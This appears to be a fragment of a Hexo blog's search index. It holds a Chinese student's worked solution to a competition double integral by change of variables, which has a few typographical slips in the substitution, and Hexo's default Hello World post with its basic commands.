      <title>我的第一篇文章</title>
      <link href="/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="以一道数学题开始我的发文"><a href="#以一道数学题开始我的发文" class="headerlink" title="以一道数学题开始我的发文"></a>以一道数学题开始我的发文</h1><p><font size=4>废话不多说，直接上题</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_D&space;\frac{(x&plus;y)&space;\ln&space;\left(1&plus;\frac{y}{x}\right)}{\sqrt{1-x-y}}&space;\mathrm{d}&space;x&space;\mathrm{d}&space;y" title="https://latex.codecogs.com/svg.image?\iint_D \frac{(x+y) \ln \left(1+\frac{y}{x}\right)}{\sqrt{1-x-y}} \mathrm{d} x \mathrm{d} y" /> </div>&emsp; 其中区域D由直线x + y = 1 与两坐标轴所围成得三角形区域。<p><strong>解:</strong><br>　　这题的式子较为复杂，直接求解可能计算量偏大，进而考虑其它方法，首先考虑换元法.<br>　　不妨设：</p><div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x&plus;y=u&space;\\\frac{y}{x}=u\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x+y=u \\\frac{y}{x}=u\end{array}\right." /> </div>　　解，得：<div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1&plus;u}&space;\\y=\frac{u&space;v}{1&plus;v}\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1+u} \\y=\frac{u v}{1+v}\end{array}\right." /> </div>　　因为由x, y 两个变量的变换所以我们需要用到<strong>隐函数存在定理3</strong>的Jacobi行列式，下面<p><img src="https://s2.loli.net/2022/10/15/yJCXGEU2qwHfaVD.png" alt="例子.png"> </p><p>【注】设 <img src="https://latex.codecogs.com/svg.image?x=x(u,&space;v),&space;\quad&space;y=y(u,&space;v)" title="https://latex.codecogs.com/svg.image?x=x(u, v), \quad y=y(u, v)" /> ，<strong>雅可比行列式</strong>是:</p><div align=center><img src="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=\left|\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}\right|" title="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=\left|\begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}\right|" /> </div><em>这只是公式，其条件需要读者自寻理解。(ps：我也是小菜鸟)</em><p><img src="https://s2.loli.net/2022/10/15/61EHL8sva3ZlQNu.jpg" alt="1665809444664.jpg"><br><em><center>（给上书本的定义，我也理解理解）</center></em><br>　　这里有个值得注意的是在积分是dxdy代表的是<strong>面积</strong>，所以在变换时需要对<strong>J</strong>加上绝对值,所以原式可以化为下面这样</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_{D1}&space;\frac{u&space;\ln&space;(1&plus;v)}{\sqrt{1-u}}\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|&space;d&space;u&space;d&space;v." title="https://latex.codecogs.com/svg.image?\iint_{D1} \frac{u \ln (1+v)}{\sqrt{1-u}}\left|\frac{\partial(x, y)}{\partial(u, v)}\right| d u d v." /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=||&space;\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}||=|&space;\frac{u}{(1&plus;v)^2}&space;\mid" title="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=|| \begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}||=| \frac{u}{(1+v)^2} \mid" /></div><p>下面来找一找积分区域：<br>　　原来的积分区域:</p><div align=center><img src="https://s2.loli.net/2022/10/15/7r1SyMhCcntuiDP.png" width=""></div>　　则 <img src="https://latex.codecogs.com/svg.image?\color{red}{u&space;=&space;x&space;&plus;&space;y}" title="https://latex.codecogs.com/svg.image?\color{red}{u = x + y}" /> 可以看作u在该可行域内的线性规划，易求得u的范围为（0,1） 而 <img src="https://latex.codecogs.com/svg.image?\color{red}{v&space;=&space;y&space;/&space;x}" title="https://latex.codecogs.com/svg.image?\color{red}{v = y / x}" /> 则可以看作过远点的直线在该区域内可行的斜率，易得角度为(0,pi/2),所以y的范围为(0，+∞)。<div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;\mu&space;\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;u&space;.&space;\\&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;u&space;\stackrel{\sqrt{1-\mu}=t}{=}&space;\int_1^0&space;\frac{\left(1-t^2\right)^2}{t}&space;\cdot(-2&space;t)&space;d&space;t&space;\\&=-2\left(\left.t\right|_1&space;^0-\left.\frac{2}{3}&space;t^3\right|_1&space;^0&plus;\frac{1}{5}\left.t^5\right|_1&space;^0\right)&space;\\&=\frac{16}{15}\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d \mu \int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d u . \\&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d u \stackrel{\sqrt{1-\mu}=t}{=} \int_1^0 \frac{\left(1-t^2\right)^2}{t} \cdot(-2 t) d t \\&=-2\left(\left.t\right|_1 ^0-\left.\frac{2}{3} t^3\right|_1 ^0+\frac{1}{5}\left.t^5\right|_1 ^0\right) \\&=\frac{16}{15}\end{aligned}" /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;v&space;&=\int_0^{&plus;\infty}&space;\ln&space;(1&plus;v)&space;d\left(-\frac{1}{1&plus;v}\right)&space;\\&=\left.-\frac{\ln&space;(1&plus;v)}{1&plus;v}\right|_0&space;^{&plus;\infty}&plus;\int_0^{&plus;\infty}&space;\frac{1}{\left(1&plus;v^2\right)^2}&space;d&space;v&space;\\&=0-\left.\frac{1}{1&plus;v}\right|_0&space;^{&plus;\infty}&space;\\&=1\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d v &=\int_0^{+\infty} \ln (1+v) d\left(-\frac{1}{1+v}\right) \\&=\left.-\frac{\ln (1+v)}{1+v}\right|_0 ^{+\infty}+\int_0^{+\infty} \frac{1}{\left(1+v^2\right)^2} d v \\&=0-\left.\frac{1}{1+v}\right|_0 ^{+\infty} \\&=1\end{aligned}" /></div><p>所以答案为<strong>16&#x2F;15</strong><br>　　下面附上一张参考答案的图：</p><div align=center><img src="https://s2.loli.net/2022/10/15/r6dFzqPkytagxR7.png" width=""></div><p><strong>感谢观看</strong></font></p><p><em>参考文章:</em><br><a href="markdown.com.cn/basic-syntax/">数学背景知识补充——雅可比矩阵 by Tiger</a><br><a href="https://www.bilibili.com/video/BV1oY4y1F7NB/?spm_id_from=333.999.0.0&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">全国大学生数学竞赛历年真题逐题精讲</a><br><a href="https://zhuanlan.zhihu.com/p/421295397">第一届全国大学生数学竞赛预赛试题及解析（非数学类）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数学竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/10/13/hello-world/"/>
      <url>/2022/10/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
